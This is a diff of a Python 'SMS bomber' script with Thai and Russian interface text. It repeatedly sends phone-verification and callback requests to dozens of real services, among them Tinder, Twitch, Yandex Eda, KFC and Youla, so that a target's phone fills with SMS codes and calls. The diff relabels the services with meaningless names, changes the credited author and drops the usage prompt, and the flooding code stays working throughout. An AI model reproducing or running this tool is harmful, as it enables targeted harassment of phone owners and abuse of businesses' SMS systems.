@@ -1,5 +1,4 @@
-# Creator: batiscuff
-# Last release: 14/05/2020
+# Creator: phoom 99
 import requests, random, datetime, sys, time, argparse, os, json
 from colorama import Fore, Back, Style
 
@@ -16,9 +15,8 @@ fail = (Fore.YELLOW+Style.BRIGHT+"[-] "+
 
 def banner():
     os.system("clear")
-    logo = """                 
-          YT: FiveZone CH          
-              ผู้สนับสนุน: Scriptking SCK
+    logo = """                           
+              ผู้สนับสนุน: ------
     """
     clrs = print(c_color+logo+W)
 
@@ -78,245 +76,245 @@ def start():
                 }
             requests.post("https://n13423.yclients.com/api/v1/book_code/312054", data=json.dumps(data_frisor), headers=frisor)
             # 1 раз в минуту
-            print(nice+"Frizor ทำงาน !"+Style.RESET_ALL)
+            print(nice+"DS ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Frizor ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"DS ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post("https://kasta.ua/api/v2/login/", data={'phone': _phone})
-            print(nice+"Kasta ทำงาน !"+Style.RESET_ALL)
+            print(nice+"GH ทำงาน !"+Style.RESET_ALL)
         except:
-            print(fail+"Kasta ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"GH ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post("https://izi.ua/api/auth/register", json={"phone": _phone9, "name": "Олег", "is_terms_accepted": "true"})
-            print(nice+"IZI ทำงาน !"+Style.RESET_ALL)
+            print(nice+"ZIP ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"IZI ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"ZIP ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post("https://junker.kiev.ua/postmaster.php", data={
             'tel': junker_phone,'name': _name,'action':'callme',
             })
-            print(nice+"Junker Kiev ทำงาน !"+Style.RESET_ALL)
+            print(nice+"OP ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Junker Kiev ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"OP ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post("https://youla.ru/web-api/auth/request_code", data={'phone': _phone})
-            print(nice+"Youla ทำงาน !"+Style.RESET_ALL)
+            print(nice+"QWE ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Youla ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"QWE ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
-            print(nice+"MailRu Cloud ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Mall ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"MailRu Cloud ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"Mall ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
             requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone9}")
-            print(nice+"BELTELECOM3 ทำงาน !"+Style.RESET_ALL)
+            print(nice+"DATE ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"BELTELECOM3 ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"DATE ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-            print(nice+"Tinder ทำงาน !"+Style.RESET_ALL)
+            print(nice+"The ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Tinder ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"The ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": _phone9,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile",})
-            print(nice+"Getmancar ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Car ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Getmancar ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"Car ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
-            print(nice+"ICQ ทำงาน !"+Style.RESET_ALL)
+            print(nice+"ICU ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"ICQ ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"ICU ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": _phone9}})
-            print(nice+"Pozichka ทำงาน !"+Style.RESET_ALL)
+            print(nice+"hub ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Pozichka ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"hub ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post(f'https://secure.online.ua/ajax/check_phone/?reg_phone={_phone}')
-            print(nice+"SecureOnline ทำงาน !"+Style.RESET_ALL)
+            print(nice+"See ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"SecureOnline ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"See ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}'.format(_phone))
-            print(nice+"SportMaster ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Report ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"SportMaster ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"Report ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": _phone9})
-            print(nice+"Звонок ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Book ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Звонок ไม่ส่ง"+Style.RESET_ALL)
+            print(fail+"Book ไม่ส่ง"+Style.RESET_ALL)
         try:
             requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": _phone},)
-            print(nice+"City24 ทำงาน !"+Style.RESET_ALL)
+            print(nice+"City ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"City24 ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"City ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"},)
-            print(nice+"Helsi ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Have ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Helsi ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Have ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone, "api": 2, "email": email})
-            print(nice+"CloudMail ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Clone ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"CloudMail ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Clone ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://auth.multiplex.ua/login", json={"login": _phone},)
-            print(nice+"Multiplex ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Mini ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Multiplex ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Mini ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone},)
-            print(nice+"MyGames ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Myme ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"MyGames ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Myme ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone})
-            print(nice+"Planetakino ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Do ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Planetakino ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Do ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
-            print(nice+"Tinder ทำงาน !"+Style.RESET_ALL)
+            print(nice+"crash ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Tinder ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"crash ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-            print(nice+"Youla ทำงาน !"+Style.RESET_ALL)
+            print(nice+"King ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Youla ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"King ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': _phone9})
-            print(nice+"LiST ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Like ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"LiST ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Like ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
-            print(nice+"MVideo ทำงาน !"+Style.RESET_ALL)
+            print(nice+"AV ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"MVideo ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"AV ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
-            print(nice+"Tinder ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Max ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Tinder ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Max ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
-            print(nice+"Twitch ทำงาน !"+Style.RESET_ALL)
+            print(nice+"New ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Twitch ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"New ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://lk.belkacar.ru/register', data={'phone': _phone9})
-            print(nice+"BelkaCar ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Noyou ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"BelkaCar ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Noyou ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
-            print(nice+"IVI ทำงาน !"+Style.RESET_ALL)
+            print(nice+"IT ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"IVI ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"IT ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
             requests.post('https://lk.belkacar.ru/get-confirmation-code', data={'phone': _phone9})
-            print(nice+"SportMaster, BelkaCar ทำงาน !"+Style.RESET_ALL)
+            print(nice+"------ ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"SportMaster ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"------ ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone})
-            print(nice+"SecureOnline ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Online ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"SecureOnline ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Online ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"})
-            print(nice+"NovaLiniya ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Pro ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"NovaLiniya ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Pro ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://mobileplanet.ua/register", data={"klient_name": _name,"klient_phone": "+" + _phone,"klient_email": _email})
-            print(nice+"MPlanet ทำงาน !"+Style.RESET_ALL)
+            print(nice+"MP4 ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"MPlanet ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"MP4 ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post( "https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
-            print(nice+"DELIMOBIL ทำงาน !"+Style.RESET_ALL)
+            print(nice+"DNA ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"DELIMOBIL ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"DNA ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://apteka366.ru/login/register/sms/send', data={"phone":_phone})
-            print(nice+"Apteka 366 ทำงาน !"+Style.RESET_ALL)
+            print(nice+"App ทำงาน !!"+Style.RESET_ALL)
         except:
-            print("Apteka 366 ไม่ส่ง ")
+            print("App ไม่ส่ง ")
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={"phone":_phone})
-            print(nice+"Belkacar ทำงาน !"+Style.RESET_ALL)
+            print(nice+"By ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Belkacar ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"By ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://drugvokrug.ru/siteActions/processSms.html', data={"cell":_phone})
-            print(nice+"Друг Вокруг ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Bm ทำงาน !! "+Style.RESET_ALL)
         except:
-            print(fail+"Друг Вокруг ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Bm ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://api.ennergiia.com/auth/api/development/lor', json={"referrer":"ennergiia", "phone": _phone9})
-            print(nice+"Energiia oтправлено!"+Style.RESET_ALL)
+            print(nice+"DFS ทำงาน!! "+Style.RESET_ALL)
         except:
-            print(fail+"Energiia ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"DFS ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.get('https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}'.format(_phone9))
-            print(nice+"Fundayshop oтправлено!"+Style.RESET_ALL)
+            print(nice+"Full ทำงาน !! "+Style.RESET_ALL)
         except:
-            print(fail+"Fundayshop ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Full ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
-            print(nice+"Gorzdrav oтправлено!"+Style.RESET_ALL)
+            print(nice+"Go ทำงาน !! "+Style.RESET_ALL)
         except:
-            print(fail+"Gorzdrav ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Go ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={"phone": _phone9})
-            print(nice+"KFC ทำงาน !"+Style.RESET_ALL)
+            print(nice+"FPS ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"KFC ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"FPS ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://api-production.viasat.ru/api/v1/auth_codes', json={"msisdn": _phone9})
-            print(nice+"Viasat ทำงาน !"+Style.RESET_ALL)
+            print(nice+"SET ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Viasat ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"SET ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number":_phone})
-            print(nice+"Yandex Food ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Yood ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Yandex Food ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Yood ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/{}/'.format(_phone9))
-            print(nice+"Сitilink ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Git ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Сitilink ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Git ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone})
-            print(nice+"Yandex Eda ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Ey ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Yandex Eda ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Ey ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
-            print(nice+"Dianet ทำงาน !"+Style.RESET_ALL)
+            print(nice+"GC ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Dianet ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"GC ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru",})
-            print(nice+"Eldorado ทำงาน !"+Style.RESET_ALL)
+            print(nice+"Dora ทำงาน !!"+Style.RESET_ALL)
         except:
-            print(fail+"Eldorado ไม่ส่ง "+Style.RESET_ALL)
+            print(fail+"Dora ไม่ส่ง "+Style.RESET_ALL)
         try:
             requests.post("https://shafa.ua/api/v3/graphiql", json={
                 "operationName": "RegistrationSendSms",
                 "variables": {"phoneNumber": "+" + phone},
                 "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
             },)
-            print(nice+"ส่ง  SMS!"+Style.RESET_ALL)
+            print(nice+"ส่ง  SMS!!"+Style.RESET_ALL)
         except:
             print(fail+"ไม่ส่ง SMS"+Style.RESET_ALL)
         iteration += 1
@@ -325,7 +323,6 @@ def start():
 
 
 def menu():
-    print(Fore.CYAN+Style.BRIGHT+"[ยิงเบอร์] ตัวอย่าง +665334****"+Style.RESET_ALL)
     global phone
     phone = input(c_color+"ใส่เบอร์ "+W)
     check_number()
